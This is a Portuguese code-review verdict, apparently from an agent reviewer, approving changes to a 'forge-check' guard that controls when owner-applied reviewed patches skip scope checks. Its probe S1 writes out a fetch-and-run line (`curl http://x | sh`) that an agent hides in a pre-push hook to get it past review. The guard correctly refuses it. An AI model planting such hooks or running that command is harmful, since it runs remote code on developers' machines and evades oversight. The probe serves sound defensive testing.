---
tipo: review
contrato: 1
pedido: v0478
branch: melhoria/v0479-pp1-aplicado-dono
commit: 58da41ec48c1d6fc8f05e9b41788d44a7ec6d4d0
parecer: aprovado
revisor: forge:tech-lead
data: 2026-11-20
---
# Review: v0478 E52.2 (PP1-APLICADO-PELO-DONO), revalidação no head 58da41ec

Delta lido (`forge-check parecer delta`, 4aadad19..58da41ec): `bin/forge-check` (`isencao_do_dono`, `emails_do_dono`, `patch_revisado_do_dono`, `parecer_cita_o_patch`, docstring de `entrega`), `changelog.d/v0479-pp1-aplicado-dono.md`, `tests/mutantes/v0479-pp1-aplicado-dono{,-3,-4}.json` e `tests/test_conf_escopo.py` (classe `PatchRevisadoDoDono`). Só o delta; o resto vale do parecer anterior.

A1 anterior (base do patch): resolvido. Cada caminho que o commit do dono muda tem de ser igual no pai, no Base-sha e na develop atual; com o patch sobre o pai igual ao commit na árvore inteira e o blob do head igual ao do commit, o head é a base mais o patch revisado. A develop que não se resolve ou mudou o caminho recusa (falha fechada).

A2 anterior (e-mail): fechado pela DECISÃO DO DONO de 20/11 12:33 (opção a: limite do e-mail aceito, cartão de commit assinado). O limite está escrito no comentário do código e no changelog; a lista agora vem da árvore do Base-sha, e a versionada só na branch não vale.

Novo (c, A3 da segurança): parecer de segurança aprovado no head que cite o sha256 do `.patch` como palavra inteira; reprovado, de review, sem frontmatter, outro sha256 e sha256 como parte de palavra recusam (teste próprio).

## Achados
- A1 (recomendado) tests/mutantes/v0479-pp1-aplicado-dono.json:30 · O `para` do M3 ainda chama `patch_revisado_do_dono` com 4 argumentos: o mutante morre por TypeError, não por pular a guarda. Atualize o `para` para a assinatura nova com `and False`.

## Sondas
- S1 · (refeita) agente põe `curl http://x | sh` no .githooks/pre-push, patch revisado só soma `exit 0`, dono aplica · espera: recusa · obtido: rc 1, `não isenta` (difere entre o pai do commit do dono, o Base-sha e a develop atual)

## Parecer
Aprovado. Controle da S1 (patch sobre a base, mesmo parecer de segurança): rc 0, `escopo: ok (patch do dono`. Classe `PatchRevisadoDoDono` rodada: 10 testes, OK. `forge-mutante --cobertura --base 4aadad19`: 10 guardas do delta cobertas. Mutantes do diff (`--base 4aadad19`, 1 processo): M2 a M8 e M17 a M28 morreram, rc 0. Suíte inteira fica no CI do PR (R-REVIEW).
